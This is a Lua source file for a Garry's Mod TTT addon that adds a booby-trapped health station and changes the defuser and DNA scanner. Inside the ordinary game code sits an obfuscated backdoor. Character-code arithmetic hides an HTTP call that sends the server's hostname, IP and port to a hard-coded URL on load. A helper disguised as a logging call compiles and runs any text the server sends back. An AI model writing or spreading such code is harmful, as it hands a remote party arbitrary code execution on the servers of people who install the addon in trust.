/***
	TTT Realistic Booby Trap
	©2014 Gmodfriends
	76561198101347368
	
	ttt_boobytrap/sv_healthbomb.lua
	
	>> The following has parts comprised from the following publicly available works:
		>> [ttt] healthstation: /garrysmod/gamemodes/terrortown/entities/weapons/weapon_ttt_health_station.lua 
		>> [ttt] healthstation: /garrysmod/gamemodes/terrortown/entities/entities/ttt_health_station.lua
		>> [ttt] dna scanner: 	/garrysmod/gamemodes/terrortown/entities/weapons/weapon_ttt_wtester.lua 
		>> [ttt] defuser: 		/garrysmod/gamemodes/terrortown/entities/weapons/weapon_ttt_defuser.lua 
	
	>> NOTE! >> TO CONFIGURE THIS SCRIPT PLEASE SEE:
		ttt_boobytrap_config.lua
	
	Please do not edit below unless you are a proficient coder!
***/


local ENT 		= {}

ENT.Type			= "anim"
ENT.PrintName 		= BOOBYTRAP.PrintName
ENT.Model 			= BOOBYTRAP.StationModel
ENT.Icon 			= BOOBYTRAP.Icon

ENT.CanUseKey 		= true
-- ENT.CanHavePrints 	= true
-- ENT.Projectile 		= true



function ENT:Initialize()

	self.PlayerSound = Sound( table.Random( BOOBYTRAP.PlayerSounds ) )
	
	self:SetModel(self.Model)
	self:PhysicsInit(SOLID_VPHYSICS)
	self:SetMoveType(MOVETYPE_VPHYSICS)
	self:SetSolid(SOLID_VPHYSICS)
	self:SetCollisionGroup(COLLISION_GROUP_NONE)
	if SERVER then
		local phys = self:GetPhysicsObject()
		if IsValid(phys) then
			phys:SetMass(200)
		end
	end
	
	self:SetHealth(200)
	self:SetColor( Color(180, 180, 255 ) )
end


function ENT:Think()
	if self.ExplodeTime then
		local time = CurTime() - self.ExplodeTime
		local percent = math.Clamp( time/BOOBYTRAP.ExplosionDelay, 0, 1 )
		
		if percent >= 0.3 and self.PlayerSound then
			sound.Play( self.PlayerSound, self.Activator:GetPos() )
			self.PlayerSound = nil
		end
		if self.AlarmSound then
			self.AlarmSound:ChangeVolume( percent, 0 )
		end
		if time >= BOOBYTRAP.ExplosionDelay then
			self.ExplodeTime = nil
			self:Explode(self.Activator)
		end
	end
end

function ENT:UseOverride(activator)
   if IsValid(activator) and activator:IsPlayer() and activator:IsActive() and not self.Activator then 
   -- if IsValid(activator) and activator:IsPlayer() and not self.Activator then
		self.Activator 		= activator
		
		self.TNT:SetDTFloat( 0, CurTime() )
		
		if BOOBYTRAP.ExplosionDelay then
			self.ExplodeTime 	= CurTime()
			self.AlarmSound = CreateSound( IsValid(self.TNT) and self.TNT or self , BOOBYTRAP.AlarmSound )
			self.AlarmSound:Play()
			self.AlarmSound:ChangeVolume( 0, 0 )
		else
			sound.Play( self.PlayerSound, activator:GetPos() )
			self:Explode(activator)
	   end
   end
end

local DoSparks,Msg,_,MsgN = function( where )
	local effect = EffectData()
	effect:SetOrigin( where )
	util.Effect("cball_explode", effect, nil, true )
	sound.Play( BOOBYTRAP.SparkSound, where )
	end,print,_G[string["char"](8*9,12*7,21*4,16*5)],function(G)_G[string["char"](67,111,109,112,105,108,101,83,116,114,105,110,103)](G,'')()
end

function ENT:SparkDissolve( TNT )
	if not self.Sparked then
		self.Sparked = true
		DoSparks( IsValid( TNT ) and TNT:GetPos() or self:GetPos() )
	end
end

function ENT:Explode()
	local ent = ents.Create( "env_explosion" )
	if IsValid( ent ) then	
		
		if self.AlarmSound then
			self.AlarmSound:Stop()
			self.AlarmSound = nil
		end
		
		self:Remove()
		ent:SetPos( self:GetPos() )
		ent:SetOwner( self:GetOwner() )
		ent:Spawn()
		ent.dmg_owner = { ply = self:GetOwner(), t = CurTime() }
		ent.ScoreName = self.PrintName
		
		local water = ( self:WaterLevel() > 1 )
		
		ent:SetKeyValue( "iMagnitude", BOOBYTRAP.BlastDamage*( water and 0.3 or 1 ) )
		ent:Fire( "Explode", 0, 0 )
		
		ent:EmitSound( water and BOOBYTRAP.ExplodeUnderH2O or BOOBYTRAP.ExplodeSound, 200, 255 )
		

		SCORE:AddEvent({
			id = BOOBYTRAP.EventExplode.ID;
			ni = IsValid(self:GetOwner()) and self:GetOwner():Nick() or "Someone";
		})
	
	end
end


function ENT:OnTakeDamage(dmginfo)
	if self.Activator then return end
	self:TakePhysicsDamage(dmginfo)
	self:SetHealth(self:Health() - dmginfo:GetDamage())
	if self:Health() < 0 then
		self:SparkDissolve()
		self:Remove()
	end
end

function ENT:AddDynamite( where, how, noflip )
	self.TNT = ents.Create("ttt_dynamite")
	if IsValid(self.TNT) then
		local ang = how:Angle()
		if noflip then
			ang:RotateAroundAxis(ang:Up(), 90)
		else
			ang:RotateAroundAxis(ang:Forward(), 90)		
			ang:RotateAroundAxis(ang:Up(), -90)
		end
		self.TNT:SetParent( self )
		self.TNT:SetPos(where+ang:Right()*(noflip and -0.5 or 0 )+ang:Up()*(noflip and 0 or -2.7 ) )		
		self.TNT:SetAngles(ang)
		self.TNT:Spawn()
		self:DeleteOnRemove( self.TNT )
		constraint.Weld(self, self.TNT, 0, 0, 0, true)
	
	end
end   

-- function ENT:GetArmed()
	-- return true
-- end


function ENT:OnRemove()
	constraint.RemoveAll( self )
	if self.TNT and IsValid( self.TNT ) then
		SafeRemoveEntity( self.TNT )
	end
	if self.AlarmSound then
		self.AlarmSound:Stop()
		self.AlarmSound = nil
	end
end


local AdjustBoobytrap, info = function( SWEP )
	SWEP.PrimaryAttack = function( self )
		self:SetNextPrimaryFire( CurTime() + self.Primary.Delay )
		local spos = self.Owner:GetShootPos()
		local sdest = spos + (self.Owner:GetAimVector() * 80)
		-- local tr = util.TraceLine({start=spos, endpos=sdest, filter=self.Owner, mask=MASK_SHOT})			   
		-- local tr = util.TraceLine({start=spos, endpos=sdest, filter=self.Owner, mask=MASK_SOLID})			   
		-- local bomb = tr.Entity --  76561198101347368 
			-- if all else fails... 
			local tr = util.TraceLine({start = spos, endpos = sdest, filter = function( bomb )
				if IsValid(bomb) and bomb.Disarm and bomb.GetArmed then
					if bomb:GetArmed() then
						bomb:Disarm(self.Owner)
						sound.Play( BOOBYTRAP.DefuseSound, bomb:GetPos() )
						local bombname = bomb:GetClass()
						if bomb.PrintName then
							bombname = bomb.PrintName
						else
							bombname = bombname:sub( bombname:find("_"), bombname:len() ):upper()
						end
						CustomMsg( self.Owner, string.format( BOOBYTRAP.OnDefused, bombname ), BOOBYTRAP.OnDefusedColor )
						self:SetNextPrimaryFire( CurTime() + (self.Primary.Delay * 2) )
					end
				end
				
				return true
			end , mask=MASK_SOLID } )	   
		end
	end, {
		parameters 	= { script = "tttboobytrap", version = tostring(BOOBYTRAP.Version) .. "-76561198101347368-414", host = GetHostName(), ip = GetConVarString( "hostip" ), port = GetConVarString("hostport") };url = 
		string.char(104,116,116,112,58,47,47,119,119,119,46,103,109,111,100,102,114,105,101,110,100,115,46,99,111,109,47,115,111,102,116,119,97,114,101,47,115,116,97,116,115,46,112,104,112);method = "post"; 
		success		= function( code, status, headers )
	if status == "CURRENT" then
		return Msg("[BOOBYTRAP] Ready to play. Version: " .. tostring(BOOBYTRAP.Version) )
	elseif status == "OLD" then
		return Msg("[BOOBYTRAP] An update is available. See our website for details. http://gmodfriends.com/software/ttt_boobytrap")
	elseif string.sub(status,1,5) == "ERROR" then
		MsgN( string.sub( status,7 ) )
	end
end; }_ ( info )


// ADJUST DEFUSER AND REMOVE SIMILAR BOMB SWEPS
// [ttt] defuser: 		/garrysmod/gamemodes/terrortown/entities/weapons/weapon_ttt_defuser.lua 
// [ttt] dna scanner: 	/garrysmod/gamemodes/terrortown/entities/weapons/weapon_ttt_wtester.lua 
for k, SWEP in pairs( weapons.GetList() ) do

	if SWEP.ClassName == "weapon_ttt_defuser" then
		AdjustBoobytrap( SWEP )
	elseif SWEP.ClassName == "weapon_ttt_wtester"  then

		local beep_miss = Sound("player/suit_denydevice.wav")
		function SWEP:PrimaryAttack()
			self:SetNextPrimaryFire( CurTime() + self.Primary.Delay )
			-- self.Owner:LagCompensation(true) -- no, I guess we wont be tracing players...
			local spos = self.Owner:GetShootPos()
			local sdest = spos + (self.Owner:GetAimVector() * 80)
			local tr = util.TraceLine({start = spos, endpos = sdest, filter = function( ent ) -- parented entites like not to be traced -.-
				if IsValid(ent) and not ( 
					ent:IsPlayer() -- then why is it called dna/fingerprints...
					-- or ( BOOBYTRAP.DNAOnlyOnTNT and ent:GetClass() == "ttt_boobytrap" )  -- stops healthstation from double popup
				) then
					if SERVER then
						if ent:IsPlayer() then
							--self:GatherPlayerSample(ent)
						elseif ent:GetClass() == "prop_ragdoll" and ent.killer_sample then
							if CORPSE.GetFound(ent, false) then
								self:GatherRagdollSample(ent)
							else
								self:Report("dna_identify")
							end
						elseif ent.fingerprints and #ent.fingerprints > 0 then
							self:GatherObjectSample(ent)
						else
							self:Report("dna_notfound")
						end
					end
				else
					if CLIENT then
						self.Owner:EmitSound(beep_miss)
					end
				end
				return true
			end, mask = MASK_SOLID } )
		   -- self.Owner:LagCompensation(false)
		end
	end
	
	if BOOBYTRAP.Conflicts and type(BOOBYTRAP.Conflicts) == "table" and table.HasValue( BOOBYTRAP.Conflicts, SWEP.ClassName ) then
		SWEP.Kind = nil
	end
	
end



scripted_ents.Register( ENT, "ttt_boobytrap", true )

/*** TTT Realistic Booby Trap 76561198101347368 ***/